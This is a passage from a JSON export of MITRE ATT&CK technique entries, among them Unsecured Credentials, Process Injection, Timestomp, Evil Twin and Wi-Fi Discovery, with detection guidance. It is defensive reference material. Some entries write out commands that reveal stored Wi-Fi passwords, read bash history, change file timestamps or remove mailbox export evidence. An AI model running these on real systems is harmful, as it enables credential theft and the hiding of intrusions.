      "detection": "There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):\n\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse."
    },
    "T1552": {
      "id": "T1552",
      "name": "Unsecured Credentials",
      "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation: Brining MimiKatz to Unix)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1552",
      "stix_id": "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517",
      "created": "2020-02-04T12:47:23.631000+00:00",
      "modified": "2025-04-15T19:58:26.362000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Access",
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "Process: Process Creation",
        "File: File Access",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.\n\nMonitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.\n\nMonitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like <code>cat ~/.bash_history</code>.\n\nAdditionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives."
    },
    "T1547.010": {
      "id": "T1547.010",
      "name": "Port Monitors",
      "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.010",
      "stix_id": "attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe",
      "created": "2020-01-24T19:46:27.750000+00:00",
      "modified": "2025-04-15T19:58:26.452000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "File: File Creation",
        "Module: Module Load",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor process API calls to <code>AddMonitor</code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \n\nMonitor Registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>, paying particular attention to changes in the \"Driver\" subkey. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism.(Citation: TechNet Autoruns)"
    },
    "T1070.008": {
      "id": "T1070.008",
      "name": "Clear Mailbox Data",
      "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.008",
      "stix_id": "attack-pattern--438c967d-3996-4870-bfc2-3954752a1927",
      "created": "2022-07-08T21:04:03.739000+00:00",
      "modified": "2025-04-15T21:56:59.810000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "File: File Deletion",
        "File: File Modification",
        "Command: Command Execution",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1037.002": {
      "id": "T1037.002",
      "name": "Login Hook",
      "description": "Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)\n\n**Note:** Login hooks were deprecated in 10.11 version of macOS in favor of [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) ",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1037.002",
      "stix_id": "attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0",
      "created": "2020-01-10T16:01:15.995000+00:00",
      "modified": "2025-04-15T22:46:43.054000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "File: File Modification",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon."
    },
    "T1659": {
      "id": "T1659",
      "name": "Content Injection",
      "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
      "tactic": "initial-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1659",
      "stix_id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
      "created": "2023-09-01T21:03:13.406000+00:00",
      "modified": "2025-04-15T22:10:29.343000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1055": {
      "id": "T1055",
      "name": "Process Injection",
      "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055",
      "stix_id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
      "created": "2017-05-31T21:30:47.843000+00:00",
      "modified": "2025-04-16T20:37:16.893000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Access",
        "Process: Process Modification",
        "File: File Modification",
        "Process: Process Metadata",
        "File: File Metadata",
        "Process: OS API Execution",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1567.004": {
      "id": "T1567.004",
      "name": "Exfiltration Over Webhook",
      "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1567.004",
      "stix_id": "attack-pattern--43f2776f-b4bd-4118-94b8-fee47e69676d",
      "created": "2023-07-20T15:30:55.763000+00:00",
      "modified": "2025-04-15T19:58:26.901000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "SaaS",
        "Office Suite",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content",
        "Command: Command Execution",
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1205": {
      "id": "T1205",
      "name": "Traffic Signaling",
      "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1205",
      "stix_id": "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:27.071000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": "Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)"
    },
    "T1021.008": {
      "id": "T1021.008",
      "name": "Direct Cloud VM Connections",
      "description": "Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log directly into accessible cloud hosted compute infrastructure through cloud native methods. Many cloud providers offer interactive connections to virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009), such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in the cloud), and AWS System Manager.(Citation: AWS System Manager).\n\nMethods of authentication for these connections can include passwords, application access tokens, or SSH keys. These cloud native methods may, by default, allow for privileged access on the host with SYSTEM or root level access. \n\nAdversaries may utilize these cloud native methods to directly access virtual infrastructure and pivot through an environment.(Citation: SIM Swapping and Abuse of the Microsoft Azure Serial Console) These connections typically provide direct console access to the VM rather than the execution of scripts (i.e., [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)).",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1021.008",
      "stix_id": "attack-pattern--45241b9e-9bbc-4826-a2cc-78855e51ca09",
      "created": "2023-06-02T15:27:55.412000+00:00",
      "modified": "2025-04-15T22:18:53.305000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1218": {
      "id": "T1218",
      "name": "System Binary Proxy Execution",
      "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1218",
      "stix_id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-15T19:58:27.332000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Module: Module Load",
        "File: File Creation",
        "Process: OS API Execution",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity."
    },
    "T1070.006": {
      "id": "T1070.006",
      "name": "Timestomp",
      "description": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.\n\nIn Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)\n\nModifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)\n\nAdversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in \u201cdouble timestomping\u201d by modifying times on both attributes simultaneously.(Citation: Double Timestomping)\n\nIn Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1070.006",
      "stix_id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
      "created": "2020-01-31T12:42:44.103000+00:00",
      "modified": "2025-04-15T19:58:27.752000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "File: File Modification",
        "File: File Metadata",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values."
    },
    "T1557.004": {
      "id": "T1557.004",
      "name": "Evil Twin",
      "description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia \u2018Evil Twin\u2019)\n\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin)  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple \u2013 a network security auditing and penetration testing tool \u2013 may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.(Citation: specter ops evil twin)  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\n\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim\u2019s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points. ",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1557.004",
      "stix_id": "attack-pattern--48b836c6-e4ca-435a-82a3-29c03e5b492e",
      "created": "2024-09-17T14:27:40.947000+00:00",
      "modified": "2025-04-15T19:58:27.842000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Traffic Flow"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1620": {
      "id": "T1620",
      "name": "Reflective Code Loading",
      "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).\n\nReflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the \u201cinjection\u201d loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1620",
      "stix_id": "attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a",
      "created": "2021-10-05T01:15:06.293000+00:00",
      "modified": "2025-04-15T19:58:27.959000+00:00",
      "platforms": [
        "macOS",
        "Linux",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Script: Script Execution",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as <code>Assembly.Load()</code> and [Native API](https://attack.mitre.org/techniques/T1106) functions such as <code>CreateThread()</code>, <code>memfd_create()</code>, <code>execve()</code>, and/or <code>execveat()</code>.(Citation: 00sec Droppers)(Citation: S1 Old Rat New Tricks)\n\nMonitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe). Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes.(Citation: MDSec Detecting DOTNET)(Citation: Introducing Donut)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1016.002": {
      "id": "T1016.002",
      "name": "Wi-Fi Discovery",
      "description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile \u201cWi-Fi name\u201d key=clear` to show a Wi-Fi network\u2019s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)\n",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1016.002",
      "stix_id": "attack-pattern--494ab9f0-36e0-4b06-b10d-57285b040a06",
      "created": "2023-09-08T15:39:50.269000+00:00",
      "modified": "2025-04-15T23:21:00.705000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
    },
    "T1480.002": {
      "id": "T1480.002",
      "name": "Mutual Exclusion",
      "description": "Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time.(Citation: Microsoft Mutexes)\n\nWhile local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes.(Citation: Microsoft Mutexes) By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised.(Citation: Sans Mutexes 2012)\n\nIn Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to acquire the lock, it continues to execute; if it fails, it exits to avoid creating a second instance of itself.(Citation: Intezer RedXOR 2021)(Citation: Deep Instinct BPFDoor 2023)\n\nMutex names may be hard-coded or dynamically generated using a predictable algorithm.(Citation: ICS Mutexes 2015)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1480.002",
      "stix_id": "attack-pattern--49fca0d2-685d-41eb-8bd4-05451cc3a742",
      "created": "2024-09-19T14:00:03.401000+00:00",
      "modified": "2025-04-15T22:50:39.088000+00:00",
      "platforms": [
